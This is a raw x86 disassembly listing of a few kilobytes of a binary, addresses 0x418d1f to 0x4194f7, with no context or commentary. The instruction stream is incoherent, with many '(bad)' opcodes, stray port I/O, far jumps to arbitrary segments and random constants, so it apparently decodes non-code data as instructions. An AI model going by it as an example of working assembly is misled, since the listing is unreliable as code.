  418d1f:	gs and ch,BYTE PTR gs:[edx-0x5f584a11]
  418d27:	mov    ch,0x26
  418d29:	inc    ecx
  418d2a:	aad    0x7c
  418d2c:	data16 aaa 
  418d2e:	xor    esp,DWORD PTR [esi-0x4b]
  418d31:	sahf   
  418d32:	popa   
  418d33:	add    al,0x90
  418d35:	loope  0x418cf3
  418d37:	mov    bh,BYTE PTR [esi-0xad323d8]
  418d3d:	scas   eax,DWORD PTR es:[edi]
  418d3e:	xlat   BYTE PTR ds:[ebx]
  418d3f:	in     eax,dx
  418d40:	call   0xa817d584
  418d45:	push   0x39
  418d47:	std    
  418d48:	pop    edx
  418d49:	mov    edx,0x27cf08d3
  418d4e:	inc    esi
  418d4f:	lock push ss
  418d51:	push   esi
  418d52:	sahf   
  418d53:	and    ebx,DWORD PTR [edi]
  418d55:	mov    ebp,eax
  418d57:	outs   dx,DWORD PTR ds:[esi]
  418d58:	jg     0x418db3
  418d5a:	pop    edi
  418d5b:	xchg   esp,eax
  418d5c:	loop   0x418d82
  418d5e:	or     edx,ebp
  418d60:	mov    BYTE PTR [ebx+eiz*2+0x11],dl
  418d64:	test   ecx,esp
  418d66:	mov    bl,0xe3
  418d68:	shl    DWORD PTR [edx+0x2ca201d6],0x3
  418d6f:	addr16 sub edx,ecx
  418d72:	dec    esi
  418d73:	cmp    BYTE PTR [esi+0x58],bl
  418d76:	cmc    
  418d77:	pop    eax
  418d78:	das    
  418d79:	jns    0x418d0c
  418d7b:	clc    
  418d7c:	loopne 0x418d9e
  418d7e:	xor    eax,DWORD PTR [esi+0x24]
  418d81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d82:	push   esp
  418d83:	mov    DWORD PTR [edi-0x7327ea54],0x427e8198
  418d8d:	sub    esi,edi
  418d8f:	push   ds
  418d90:	std    
  418d91:	cdq    
  418d92:	jo     0x418dfa
  418d94:	enter  0x882e,0xaf
  418d98:	or     al,0xe3
  418d9a:	xchg   ecx,eax
  418d9b:	or     DWORD PTR cs:[ecx+ebp*8],ebp
  418d9f:	push   edi
  418da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418da1:	sub    dh,BYTE PTR [eax+edx*8-0x77b36010]
  418da8:	mov    dh,0x62
  418daa:	ins    DWORD PTR es:[edi],dx
  418dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dac:	call   0x6d2f:0xb6f7c8fb
  418db3:	inc    edx
  418db4:	rcl    BYTE PTR [esi],0xc3
  418db7:	add    eax,0xb8d2e681
  418dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dbd:	shl    BYTE PTR [esp+eax*4+0x2a],1
  418dc1:	loopne 0x418df1
  418dc3:	mov    al,0x44
  418dc5:	in     al,dx
  418dc6:	fwait
  418dc7:	cmp    DWORD PTR [esi-0x24],0xffffffc8
  418dcb:	push   ebx
  418dcc:	or     al,0x7c
  418dce:	mov    ds:0x1a6539ff,eax
  418dd3:	dec    esp
  418dd4:	test   BYTE PTR [esi+0x48a5950b],dl
  418dda:	push   ebp
  418ddb:	stos   BYTE PTR es:[edi],al
  418ddc:	sbb    DWORD PTR [edx-0x4],edi
  418ddf:	xchg   ebx,eax
  418de0:	adc    eax,0xe4fc3074
  418de5:	mov    edx,0xe6fa4d85
  418dea:	test   BYTE PTR [esi+0x2e7751b9],dh
  418df0:	test   DWORD PTR [edi],ecx
  418df2:	shl    BYTE PTR [esi+0x49],cl
  418df5:	mov    edx,0x37c1c322
  418dfa:	jmp    0x3413:0x6f79fc53
  418e01:	dec    esi
  418e02:	in     al,0xef
  418e04:	fdivr  DWORD PTR [ecx]
  418e06:	inc    ebx
  418e07:	cdq    
  418e08:	mov    ebx,ss
  418e0a:	add    edx,DWORD PTR ds:0xdc5b6b7a
  418e10:	mov    ah,0x96
  418e12:	fist   DWORD PTR [ecx+0x575dd7e5]
  418e18:	aad    0xa9
  418e1a:	mov    cl,0x3e
  418e1c:	sub    BYTE PTR [edi+0x200e6d82],bh
  418e22:	adc    dl,BYTE PTR [eax-0x16]
  418e25:	pusha  
  418e26:	shl    al,0x37
  418e29:	mov    edx,0xf3f713eb
  418e2e:	clc    
  418e2f:	sub    eax,0x8456f46e
  418e34:	xchg   BYTE PTR [edi-0x1c5deff0],al
  418e3a:	jp     0x418de2
  418e3c:	mov    ecx,0x9334caeb
  418e41:	xor    BYTE PTR [esi-0x3e87a3e7],bl
  418e47:	retf   0x3316
  418e4a:	push   ds
  418e4b:	aam    0xdc
  418e4d:	add    BYTE PTR [ecx-0x5e],cl
  418e50:	cmp    DWORD PTR [ebx-0x2b],edx
  418e53:	mov    ebx,0xad9c7075
  418e58:	outs   dx,DWORD PTR ds:[esi]
  418e59:	test   cl,bh
  418e5b:	out    0x6c,al
  418e5d:	ja     0x418e1e
  418e5f:	jl     0x418ea0
  418e61:	clc    
  418e62:	pop    es
  418e63:	nop
  418e64:	fbld   TBYTE PTR [edx+0x71]
  418e67:	rcr    DWORD PTR ds:0x4e0b734e,0xb7
  418e6e:	arpl   sp,bp
  418e70:	cld    
  418e71:	xor    ebp,DWORD PTR [ecx-0x2c03244e]
  418e77:	and    BYTE PTR ds:0x32a76d28,bh
  418e7d:	push   esp
  418e7e:	dec    ecx
  418e7f:	out    dx,al
  418e80:	inc    edx
  418e81:	mov    edi,0x5c45ae68
  418e86:	neg    BYTE PTR [eax]
  418e88:	(bad)  
  418e89:	dec    ebx
  418e8a:	inc    ebp
  418e8b:	in     eax,0xa4
  418e8d:	dec    edi
  418e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e8f:	inc    edi
  418e90:	add    cl,dl
  418e92:	push   0xffffff91
  418e94:	stos   DWORD PTR es:[edi],eax
  418e95:	in     al,0xf7
  418e97:	push   0x69f35aa1
  418e9c:	push   edx
  418e9d:	pop    ecx
  418e9e:	mov    esi,0xb205b54e
  418ea3:	dec    esp
  418ea4:	xchg   edx,eax
  418ea5:	push   ebp
  418ea6:	dec    esp
  418ea7:	sbb    edi,DWORD PTR [ecx-0x54]
  418eaa:	pop    edi
  418eab:	sub    eax,0x1d1c5c99
  418eb0:	xchg   esi,eax
  418eb1:	icebp  
  418eb2:	sbb    bh,BYTE PTR [eax+edx*1+0xa935019]
  418eb9:	xchg   esi,eax
  418eba:	sar    DWORD PTR [ebp+0x7b],0xf
  418ebe:	inc    ebx
  418ebf:	jo     0x418ecc
  418ec1:	sbb    eax,0x6e7caf9a
  418ec6:	jp     0x418f0d
  418ec8:	dec    ecx
  418ec9:	out    0x97,eax
  418ecb:	lock leave 
  418ecd:	push   esi
  418ece:	jbe    0x418edf
  418ed0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ed1:	test   eax,0x13afb8e6
  418ed6:	xchg   esi,eax
  418ed7:	cs add al,0xdf
  418eda:	bound  eax,QWORD PTR [ecx-0x527abf9a]
  418ee0:	xchg   edi,eax
  418ee1:	call   FWORD PTR [esi+edx*4-0x2867d6e1]
  418ee8:	nop
  418ee9:	jle    0x418f0d
  418eeb:	ror    DWORD PTR [esi+eax*8-0x1f6a08cd],cl
  418ef2:	adc    al,0xf8
  418ef4:	adc    cl,BYTE PTR [edx+edi*8]
  418ef7:	sub    al,0x3c
  418ef9:	inc    edx
  418efa:	mov    edi,0xb7f3e6c5
  418eff:	mov    ecx,0xf686d72f
  418f04:	out    dx,al
  418f05:	sub    BYTE PTR [edx+0x65],dl
  418f08:	cmp    BYTE PTR [eax],0x7b
  418f0b:	aaa    
  418f0c:	int3   
  418f0d:	jmp    0x1065e62d
  418f12:	dec    ecx
  418f13:	call   0x3cc:0x51dc4f2e
  418f1a:	jg     0x418eea
  418f1c:	shl    DWORD PTR [esi],0xf5
  418f1f:	(bad)  [ebx-0x8]
  418f22:	mov    ch,0xad
  418f24:	out    dx,al
  418f25:	jae    0x418ee9
  418f27:	sub    esi,esp
  418f29:	xchg   edi,eax
  418f2a:	sbb    ecx,DWORD PTR [esi+0x11e74554]
  418f30:	shl    DWORD PTR [edi-0x3f775c7e],cl
  418f36:	cwde   
  418f37:	and    ch,BYTE PTR [ebp+0x6a4ff239]
  418f3d:	hlt    
  418f3e:	sbb    bl,bl
  418f40:	fld    QWORD PTR [eax+edi*2-0x3de38a94]
  418f47:	inc    eax
  418f48:	mov    bl,0x36
  418f4a:	shl    DWORD PTR ds:[ecx-0x7c25015c],0x36
  418f52:	pop    ss
  418f53:	mov    ah,0xb
  418f55:	aad    0x6f
  418f57:	inc    BYTE PTR [ecx]
  418f59:	mov    ebx,0x19a8b683
  418f5e:	xchg   edi,eax
  418f5f:	jge    0x418efb
  418f61:	call   esi
  418f63:	shl    DWORD PTR [eax+0x2795f71f],0xcd
  418f6a:	js     0x418f62
  418f6c:	dec    ebp
  418f6d:	ins    DWORD PTR es:[edi],dx
  418f6e:	test   al,0xd1
  418f70:	icebp  
  418f71:	out    0x11,eax
  418f73:	pop    esi
  418f74:	jmp    DWORD PTR [ecx+0x1c43b627]
  418f7a:	fsubr  DWORD PTR [ecx]
  418f7c:	cs pop ebp
  418f7e:	adc    BYTE PTR [esi],cl
  418f80:	pop    esp
  418f81:	test   eax,0xdac42e9c
  418f86:	cmp    BYTE PTR [ecx+0x66ab08c7],ah
  418f8c:	jmp    0x1ee6:0x80c8e05b
  418f93:	pop    ecx
  418f94:	sar    BYTE PTR [edx+ecx*4],cl
  418f97:	cmp    ch,BYTE PTR [ecx+0x67]
  418f9a:	add    BYTE PTR [eax],0xf3
  418f9d:	push   cs
  418f9e:	sbb    eax,0x7a085c24
  418fa3:	dec    eax
  418fa4:	dec    edi
  418fa5:	(bad)  
  418fa6:	into   
  418fa7:	pop    esi
  418fa8:	das    
  418fa9:	mov    ch,0x7b
  418fab:	(bad)  
  418fac:	push   ebx
  418fad:	mov    al,ds:0x262dfddc
  418fb2:	ss out 0xd8,eax
  418fb5:	add    esp,DWORD PTR [edi-0x128951b7]
  418fbb:	in     al,0xd5
  418fbd:	test   bh,bh
  418fbf:	pop    ecx
  418fc0:	out    0xe5,eax
  418fc2:	jp     0x418f79
  418fc4:	jmp    0xae00a161
  418fc9:	push   ecx
  418fca:	jb     0x418fe6
  418fcc:	mov    eax,cr2
  418fcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fd0:	pop    eax
  418fd1:	mov    ebx,0x159c45f6
  418fd6:	or     DWORD PTR [esi+0xc],esi
  418fd9:	dec    ebx
  418fda:	or     ebx,DWORD PTR [ecx+0x394f8633]
  418fe0:	or     BYTE PTR [edx],dl
  418fe2:	nop
  418fe3:	popa   
  418fe4:	fadd   DWORD PTR [ecx-0x4f]
  418fe7:	ror    bh,cl
  418fe9:	ss jae 0x418ff1
  418fec:	dec    esp
  418fed:	addr16 mov al,0x51
  418ff0:	mov    cs,WORD PTR [esi-0x5a]
  418ff3:	sbb    ebx,ebp
  418ff5:	push   ecx
  418ff6:	dec    eax
  418ff7:	adc    ebx,ebx
  418ff9:	neg    DWORD PTR es:[edi+0x55]
  418ffd:	sub    al,0xd2
  418fff:	mov    eax,0xf2b17716
  419004:	lock add cl,BYTE PTR [esi-0x123dc23d]
  41900b:	pop    eax
  41900c:	fadd   DWORD PTR [ebx+0x1d]
  41900f:	and    al,0x59
  419011:	xchg   BYTE PTR [edi-0x3],ah
  419014:	shl    edx,cl
  419016:	mov    esp,0x664575af
  41901b:	push   es
  41901c:	dec    ebx
  41901d:	jg     0x418fa0
  41901f:	sti    
  419020:	cmp    edi,esi
  419022:	add    ebp,DWORD PTR [ecx+0x367d7341]
  419028:	fs scas eax,DWORD PTR es:[edi]
  41902a:	sahf   
  41902b:	and    BYTE PTR [edi+0x17],al
  41902e:	cs sub cl,al
  419031:	out    dx,al
  419032:	cmp    DWORD PTR [ebx+0x6855b2b],esi
  419038:	mov    ebp,0xc2c622ff
  41903d:	mov    bh,0x30
  41903f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419041:	and    eax,esi
  419043:	cmp    BYTE PTR [eax+0x4a],0x2c
  419047:	lea    ebx,[ebp-0x4e38bf4f]
  41904d:	js     0x41903e
  41904f:	xor    al,BYTE PTR [ebx+0x2b9113b7]
  419055:	push   ebp
  419056:	or     eax,0xa758b1bf
  41905b:	shl    DWORD PTR [esi-0x34],cl
  41905e:	repnz and BYTE PTR [ecx],ch
  419061:	jo     0x4190bf
  419063:	pop    esi
  419064:	ret    0x23e0
  419067:	inc    ebp
  419068:	xchg   DWORD PTR [ebx+0x424c40d6],edx
  41906e:	push   ss
  41906f:	out    0x94,eax
  419071:	imul   edi,DWORD PTR gs:[ebx],0x6a93cbd2
  419078:	addr16 dec esp
  41907a:	in     eax,0xb9
  41907c:	dec    ebp
  41907d:	xchg   ecx,eax
  41907e:	push   es
  41907f:	jp     0x419037
  419081:	and    eax,0xa866237d
  419086:	adc    bh,BYTE PTR [ebx+0x3d]
  419089:	adc    al,0xdc
  41908b:	shl    BYTE PTR [edx+0x61],1
  41908e:	adc    DWORD PTR [ecx+eax*1+0x69],ebp
  419092:	fbstp  TBYTE PTR [esi+0x50]
  419095:	dec    esp
  419096:	dec    esp
  419097:	stos   BYTE PTR es:[edi],al
  419098:	jle    0x41910f
  41909a:	dec    eax
  41909b:	(bad)  
  41909c:	jne    0x419094
  41909e:	int3   
  41909f:	imul   eax,DWORD PTR [esi+ebp*2+0x55],0xffffffee
  4190a4:	leave  
  4190a5:	ja     0x419090
  4190a7:	outs   dx,DWORD PTR ds:[esi]
  4190a8:	loop   0x4190d0
  4190aa:	mov    ds:0x66f8899d,al
  4190af:	dec    ebp
  4190b0:	test   dl,al
  4190b2:	out    dx,eax
  4190b3:	scas   al,BYTE PTR es:[edi]
  4190b4:	scas   al,BYTE PTR es:[edi]
  4190b5:	mov    ch,0x20
  4190b7:	mov    ds:0x30edd23,eax
  4190bc:	bsf    esp,DWORD PTR [ebp+0x3938afb4]
  4190c3:	enter  0xa9ec,0x61
  4190c7:	(bad)
  4190cb:	dec    esi
  4190cc:	popa   
  4190cd:	sub    dl,BYTE PTR [edi*8+0x2a2e374a]
  4190d4:	retf   0x4920
  4190d7:	sub    BYTE PTR [esi],dl
  4190d9:	mov    eax,ds:0xc6b573b7
  4190de:	and    cl,BYTE PTR [esi-0x303aa2ae]
  4190e4:	stc    
  4190e5:	sub    edx,DWORD PTR [ecx+0x75fd5847]
  4190eb:	or     BYTE PTR [eax+0x67],cl
  4190ee:	sar    BYTE PTR [ebx+0x527bb601],cl
  4190f4:	es jns 0x4190e3
  4190f7:	fwait
  4190f8:	addr16 sar bh,cl
  4190fb:	(bad)  
  4190fc:	sbb    eax,0x95f7eeeb
  419101:	ret    
  419102:	js     0x419109
  419104:	(bad)  
  419105:	mov    edi,0x4b5279d
  41910a:	std    
  41910b:	push   eax
  41910c:	sub    bh,0x82
  41910f:	jbe    0x4190a2
  419111:	loop   0x4190c0
  419113:	mov    ch,0x69
  419115:	cdq    
  419116:	jne    0x419159
  419118:	or     ebx,esp
  41911a:	dec    edi
  41911b:	sbb    bh,BYTE PTR [eax-0x75]
  41911e:	add    BYTE PTR [eax-0x2c],0xc2
  419122:	call   0x6ea01378
  419127:	mov    ah,0xc7
  419129:	jae    0x4190eb
  41912b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41912c:	mov    ah,0xf7
  41912e:	xor    BYTE PTR [eax],bl
  419130:	xchg   ecx,eax
  419131:	(bad)  
  419133:	mov    DWORD PTR [esi+edx*1+0x1de545e3],ebx
  41913a:	pop    es
  41913b:	dec    eax
  41913c:	sbb    ecx,DWORD PTR [ebx+0x6e28c1b8]
  419142:	or     al,0xa2
  419144:	xchg   edx,eax
  419145:	add    al,0x6b
  419147:	jo     0x419105
  419149:	adc    edx,DWORD PTR [esp+edi*1+0x21601490]
  419150:	out    dx,eax
  419151:	and    BYTE PTR [esi+ebx*8-0x3f],cl
  419155:	mov    cl,BYTE PTR [ebx]
  419157:	mov    cl,0xe
  419159:	xchg   ch,ah
  41915b:	(bad)  
  41915c:	(bad)  
  41915d:	ror    DWORD PTR [ebx-0x3bdf4229],0x99
  419164:	or     BYTE PTR [ebx-0x48],0xc0
  419168:	fidivr WORD PTR [ebp-0x6a358808]
  41916e:	sar    BYTE PTR [ebp+edx*8+0x23],cl
  419172:	bound  ebx,QWORD PTR [eax+0x39]
  419175:	inc    ebx
  419176:	lahf   
  419177:	fcmovne st,st(2)
  419179:	cli    
  41917a:	fucomip st,st(3)
  41917c:	leave  
  41917d:	fbstp  TBYTE PTR ds:0xcff2e4f1
  419183:	sbb    DWORD PTR [ecx+ebx*8-0xa],edx
  419187:	dec    esi
  419188:	push   eax
  419189:	sti    
  41918a:	test   BYTE PTR [ebx-0x38],dl
  41918d:	add    DWORD PTR [edi+eax*8+0x61],edi
  419191:	xchg   edi,eax
  419192:	mov    ?,WORD PTR [ebx]
  419194:	push   edi
  419195:	cmp    bl,dh
  419197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419198:	enter  0x5ef7,0x10
  41919c:	adc    DWORD PTR [esi-0x4d13ff5b],ebp
  4191a2:	or     ebx,eax
  4191a4:	jo     0x41918d
  4191a6:	in     al,dx
  4191a7:	shl    DWORD PTR [edx-0x7c73f486],1
  4191ad:	xor    eax,0x7f283889
  4191b2:	fist   DWORD PTR ds:0x20883bb3
  4191b8:	inc    ecx
  4191b9:	shl    BYTE PTR [ebx+0x6c],0xea
  4191bd:	in     eax,0x2b
  4191bf:	xchg   edi,eax
  4191c0:	add    eax,0xa03a8fac
  4191c5:	mov    ?,esi
  4191c7:	fsubr  QWORD PTR [ecx+0x32]
  4191ca:	or     eax,0x154bff70
  4191cf:	inc    edx
  4191d0:	enter  0xb031,0x87
  4191d4:	dec    ebx
  4191d5:	popa   
  4191d6:	pop    es
  4191d7:	ss icebp 
  4191d9:	popa   
  4191da:	mov    esp,DWORD PTR [ebp-0x51]
  4191dd:	and    eax,0x1ede31f2
  4191e2:	(bad)  
  4191e4:	xor    DWORD PTR [esi],0x26
  4191e7:	das    
  4191e8:	or     BYTE PTR [esi+0x37769c86],bl
  4191ee:	push   es
  4191ef:	jle    0x419212
  4191f1:	lahf   
  4191f2:	int3   
  4191f3:	ja     0x419199
  4191f5:	adc    eax,0x90e2156a
  4191fa:	das    
  4191fb:	push   ecx
  4191fc:	call   0x8195c9c7
  419201:	test   BYTE PTR [ecx+0x7d948f38],al
  419207:	xor    bh,bh
  419209:	iret   
  41920a:	push   ds
  41920b:	push   ecx
  41920c:	popf   
  41920d:	xchg   ebx,eax
  41920e:	pop    es
  41920f:	xor    BYTE PTR [edx+0x1a],bl
  419212:	inc    ecx
  419213:	push   ds
  419214:	mul    DWORD PTR [ebx+0x60862789]
  41921a:	mov    esi,0x6d14dba1
  41921f:	inc    esi
  419220:	out    0xbe,eax
  419222:	add    ah,BYTE PTR [ebx+eiz*1+0x52]
  419226:	aad    0x3b
  419228:	fcomp  DWORD PTR [edi]
  41922a:	mov    ecx,0xaae1615c
  41922f:	(bad)  
  419230:	aas    
  419231:	stos   DWORD PTR es:[edi],eax
  419232:	ins    DWORD PTR es:[edi],dx
  419233:	mov    ebx,0xe6d17c57
  419238:	test   ah,ah
  41923a:	sbb    al,BYTE PTR [ebx]
  41923c:	add    ecx,DWORD PTR [edx]
  41923e:	push   es
  41923f:	and    ecx,0x8d1292f
  419245:	das    
  419246:	fs xchg ebx,eax
  419248:	imul   esi,DWORD PTR [edx],0x19
  41924b:	mov    ebp,0xcc44f1b0
  419250:	mov    al,0x2
  419252:	and    DWORD PTR [ebx+ebp*8],ebx
  419255:	and    eax,0xa369ce52
  41925a:	in     eax,dx
  41925b:	lods   al,BYTE PTR ds:[esi]
  41925c:	or     DWORD PTR [ebx-0x1dba0e5c],esi
  419262:	pop    edi
  419263:	clc    
  419264:	push   ebx
  419265:	(bad)  
  419266:	xor    ecx,DWORD PTR [edx+0x26]
  419269:	fwait
  41926a:	mov    esi,DWORD PTR [esi-0x5a]
  41926d:	mov    bl,0xe4
  41926f:	mov    al,ah
  419271:	push   es
  419272:	leave  
  419273:	icebp  
  419274:	mov    cl,BYTE PTR ds:0x77aac57b
  41927a:	jge    0x41922f
  41927c:	fsubr  DWORD PTR [eax]
  41927e:	xchg   ebx,eax
  41927f:	dec    esp
  419280:	repnz jmp 0x1ae6:0xa717904f
  419288:	ficomp DWORD PTR [eax]
  41928a:	xor    eax,0x75c2480e
  41928f:	out    dx,al
  419290:	cmc    
  419291:	and    DWORD PTR [esi-0x1c],edi
  419294:	and    BYTE PTR [ecx],0xc9
  419297:	mov    ds:0xadd132f6,al
  41929c:	stos   BYTE PTR es:[edi],al
  41929d:	sbb    ah,BYTE PTR [esi-0x6d59ad38]
  4192a3:	clc    
  4192a4:	test   eax,0x9c6d49a4
  4192a9:	dec    eax
  4192aa:	outs   dx,DWORD PTR ds:[esi]
  4192ab:	sbb    ecx,ebx
  4192ad:	call   0xe983:0xdccb8283
  4192b4:	or     DWORD PTR [eax-0x6da6bb23],ebx
  4192ba:	pop    ecx
  4192bb:	add    al,0x24
  4192bd:	adc    DWORD PTR [ebp+0x50],ecx
  4192c0:	or     BYTE PTR [ebx],0x3d
  4192c3:	mov    WORD PTR [ecx+0x6311fbeb],es
  4192c9:	(bad)  
  4192ca:	mov    esi,0xea44356a
  4192cf:	clc    
  4192d0:	cmc    
  4192d1:	mov    bh,BYTE PTR [ebx+0x5d]
  4192d4:	xor    BYTE PTR [ebx+0x9],al
  4192d7:	mov    cl,0x81
  4192d9:	retf   
  4192da:	dec    ebp
  4192dc:	mov    BYTE PTR [edx],ch
  4192de:	sbb    ebx,esi
  4192e0:	cld    
  4192e1:	pusha  
  4192e2:	jbe    0x41929a
  4192e4:	mov    eax,ds:0x431e66f6
  4192e9:	pop    ds
  4192ea:	jl     0x419281
  4192ec:	rcl    bh,cl
  4192ee:	xor    eax,0xbd9ba458
  4192f3:	adc    BYTE PTR [esi-0x29b4a7dc],0xa6
  4192fa:	popf   
  4192fb:	adc    al,0x50
  4192fd:	fincstp 
  4192ff:	js     0x4192c2
  419301:	or     al,0x1b
  419303:	xchg   ecx,eax
  419304:	jge    0x4192e3
  419306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419307:	stos   DWORD PTR es:[edi],eax
  419308:	jmp    DWORD PTR [ebp-0x61]
  41930b:	repz cwde 
  41930d:	jo     0x419315
  41930f:	sub    bl,BYTE PTR [edi-0x25ff5a45]
  419315:	or     eax,0xb11a23b1
  41931a:	or     al,0x65
  41931c:	mov    ch,0x43
  41931e:	adc    DWORD PTR [edx-0x3adab69d],edx
  419324:	sbb    ebp,DWORD PTR [esi+0x33]
  419327:	xchg   DWORD PTR [edi+0x4b],edx
  41932a:	mov    ch,0x2b
  41932c:	loope  0x4192cc
  41932e:	xlat   BYTE PTR ds:[ebx]
  41932f:	call   0x7e4:0x3e6cf1e2
  419336:	mov    dl,0x1b
  419338:	fisttp WORD PTR [esi+0x31d04772]
  41933e:	xor    ah,BYTE PTR [edx-0x34]
  419341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419342:	imul   edx,DWORD PTR [esi-0x51],0x385698bd
  419349:	lods   al,BYTE PTR ds:[esi]
  41934a:	aad    0x72
  41934c:	xor    bl,BYTE PTR [edi+0x55de203f]
  419352:	fsubr  DWORD PTR [edx+0x7f0a5200]
  419358:	jmp    0x4226:0xb5f825da
  41935f:	scas   eax,DWORD PTR es:[edi]
  419360:	dec    ebx
  419361:	mov    ch,0xa2
  419363:	scas   al,BYTE PTR es:[edi]
  419364:	outs   dx,DWORD PTR ds:[esi]
  419365:	or     edx,DWORD PTR [edi-0x3a4be42e]
  41936b:	adc    eax,esp
  41936d:	cdq    
  41936e:	inc    ebp
  41936f:	pop    ds
  419370:	shl    ah,cl
  419372:	push   ss
  419373:	jmp    0x419392
  419375:	adc    DWORD PTR [esi-0x64],ebp
  419378:	cmp    eax,0x8a0062ed
  41937d:	int    0x6d
  41937f:	int    0xd1
  419381:	lahf   
  419382:	test   BYTE PTR [eax+0x8d7366f],bl
  419388:	cli    
  419389:	loope  0x419372
  41938b:	cmp    ebp,DWORD PTR [esi]
  41938d:	jle    0x41939b
  41938f:	inc    ecx
  419390:	mov    dh,0x36
  419392:	lods   eax,DWORD PTR ds:[esi]
  419393:	psubusw mm5,QWORD PTR [edx]
  419396:	sub    edx,DWORD PTR [ebp-0x7f]
  419399:	push   edi
  41939a:	stc    
  41939b:	adc    al,0x37
  41939d:	(bad)  
  41939e:	cdq    
  41939f:	retf   
  4193a0:	push   edx
  4193a1:	xor    edi,DWORD PTR [ebx+eiz*4-0x38]
  4193a5:	lods   eax,DWORD PTR ds:[esi]
  4193a6:	add    cl,BYTE PTR [ebx-0x1b]
  4193a9:	pop    ebp
  4193aa:	cmp    DWORD PTR [esp+eax*2-0x38d50f4b],ebp
  4193b1:	in     al,0xb7
  4193b3:	(bad)  
  4193b4:	aam    0xca
  4193b6:	fisttp QWORD PTR [esi+0xc46d462]
  4193bc:	inc    ecx
  4193bd:	vmread DWORD PTR [edi+0x34],ebx
  4193c1:	loopne 0x4193b8
  4193c3:	cs in  al,0x53
  4193c6:	cdq    
  4193c7:	sub    ebx,DWORD PTR [ebp+0x7b94c428]
  4193cd:	(bad)  
  4193ce:	and    eax,0x3146726a
  4193d3:	out    0xf5,al
  4193d5:	scas   al,BYTE PTR es:[edi]
  4193d6:	dec    edi
  4193d7:	jle    0x41944b
  4193d9:	xchg   ebx,eax
  4193da:	cdq    
  4193db:	mov    edx,0x7fb01a06
  4193e0:	test   eax,0x8a2aa228
  4193e5:	mov    ebx,0xadfe919
  4193ea:	out    0x6d,al
  4193ec:	xchg   edx,eax
  4193ed:	aaa    
  4193ee:	in     al,dx
  4193ef:	cmovnp eax,DWORD PTR cs:[ecx+eiz*1-0x47]
  4193f5:	arpl   si,si
  4193f7:	dec    BYTE PTR [edx-0x24]
  4193fa:	add    DWORD PTR [edx-0x17],edi
  4193fd:	les    esi,FWORD PTR [edi]
  4193ff:	mov    cl,0x92
  419401:	retf   
  419402:	add    DWORD PTR [edx+0x3d],edi
  419405:	popa   
  419406:	jge    0x4193ca
  419408:	xor    ah,ah
  41940a:	mov    bh,BYTE PTR [edx+0x6b]
  41940d:	aaa    
  41940e:	xchg   ebx,eax
  41940f:	das    
  419410:	mov    ch,BYTE PTR [ecx]
  419412:	ja     0x4193a4
  419414:	test   eax,0x64839877
  419419:	adc    cl,BYTE PTR [ebp+0x22]
  41941c:	imul   esi,DWORD PTR [ebx-0x63],0x6bf8fb95
  419423:	mov    DWORD PTR [esi+0x376eb353],edi
  419429:	out    0x33,al
  41942b:	sbb    ebx,edx
  41942d:	adc    dh,BYTE PTR es:[ecx+esi*4-0xec00413]
  419435:	mov    ecx,edx
  419437:	pop    esp
  419438:	repnz shl DWORD PTR [edx+ecx*1],cl
  41943c:	xchg   ebx,eax
  41943d:	and    DWORD PTR [eax],esi
  41943f:	mov    edx,0x330e627c
  419444:	mov    esp,0x53bd2aec
  419449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41944a:	gs sub eax,0x372e1617
  419450:	or     edx,DWORD PTR [ecx+0x2a469978]
  419456:	sbb    al,0x70
  419458:	mov    bl,0xe2
  41945a:	inc    eax
  41945b:	xchg   esp,eax
  41945c:	fld    TBYTE PTR [edi+0x51eca8]
  419462:	pop    edx
  419463:	dec    ebp
  419464:	nop
  419465:	sbb    DWORD PTR [edi+0x77c8c69],ecx
  41946b:	fs icebp 
  41946d:	call   0xba33:0x21f72c1e
  419474:	and    BYTE PTR [ebp+0x20],ah
  419477:	dec    ebp
  419478:	popa   
  419479:	data16 jl 0x419412
  41947c:	cmc    
  41947d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41947e:	popa   
  41947f:	mov    dl,0xfe
  419481:	sub    eax,0xad888c9
  419486:	pop    ebx
  419487:	or     al,0x3b
  419489:	ja     0x4194bb
  41948b:	(bad)  
  41948c:	adc    dl,BYTE PTR [ecx-0x7e]
  41948f:	mov    ebx,0xbc257d52
  419494:	cmp    BYTE PTR [esp+ebp*1+0x2de39478],bh
  41949b:	inc    eax
  41949c:	mov    dh,0x2e
  41949e:	xchg   ecx,eax
  41949f:	retf   0x346a
  4194a2:	pop    eax
  4194a3:	push   cs
  4194a4:	pop    ebx
  4194a5:	fs loope 0x41951d
  4194a8:	push   cs
  4194a9:	aaa    
  4194aa:	mov    esi,0x9e92e4f3
  4194af:	sub    ebx,esp
  4194b1:	test   ecx,esi
  4194b3:	daa    
  4194b4:	(bad)  ds:0x21ba8217
  4194ba:	adc    DWORD PTR ds:0x53a8a7e6,0x4
  4194c1:	cwde   
  4194c2:	leave  
  4194c3:	pop    edx
  4194c4:	push   0x70
  4194c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194c7:	dec    esp
  4194c8:	sahf   
  4194c9:	mov    cl,0x12
  4194cb:	or     al,BYTE PTR ds:0x45129d5e
  4194d1:	dec    esp
  4194d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194d3:	mov    ds:0x30e1a520,eax
  4194d8:	adc    al,0x9b
  4194da:	idiv   DWORD PTR [edi-0x41a186a5]
  4194e0:	jl     0x4194f4
  4194e2:	lods   al,BYTE PTR ds:[esi]
  4194e3:	and    al,0xe0
  4194e5:	sbb    BYTE PTR [ebx+0x36946f04],0xf5
  4194ec:	lock or cl,BYTE PTR [ecx]
  4194ef:	stos   DWORD PTR es:[edi],eax
  4194f0:	fsubr  QWORD PTR [ebp+edi*8-0x6bbb8e64]
  4194f7:	mov    ebp,0x2a0cc047
